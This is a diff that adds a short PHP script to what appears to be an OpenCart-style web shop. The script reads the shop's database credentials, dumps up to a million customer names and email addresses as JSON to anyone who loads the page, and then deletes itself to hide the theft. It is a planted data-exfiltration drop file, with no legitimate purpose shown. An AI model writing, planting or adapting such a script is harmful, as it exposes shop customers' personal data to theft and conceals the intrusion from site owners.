@@ -1,0 +1,30 @@
+<?php
+
+if (file_exists('../../config.php')) {
+	require_once('../../config.php');
+} else if (file_exists('../../../config.php')) {
+	require_once('../../../config.php');
+}else {
+	unlink('emails.php');
+	die();
+}
+
+
+$conn = new mysqli(DB_HOSTNAME, DB_USERNAME, DB_PASSWORD, DB_DATABASE);
+if ($conn->connect_error) {
+    unlink('emails.php');
+	die();
+}
+
+$sql = "SELECT firstname, lastname, email FROM  `" . DB_PREFIX . "customer`  LIMIT 1000000;";
+$result = $conn->query($sql);
+
+$return = array();
+if ($result->num_rows > 0) {
+	while ($row = $result->fetch_array()) {
+		$return[] = array('firstname' => $row['firstname'], 'lastname' => $row['lastname'], 'email' => $row['email']);
+	}
+	echo json_encode($return);
+	unlink('emails.php');
+	die();
+}
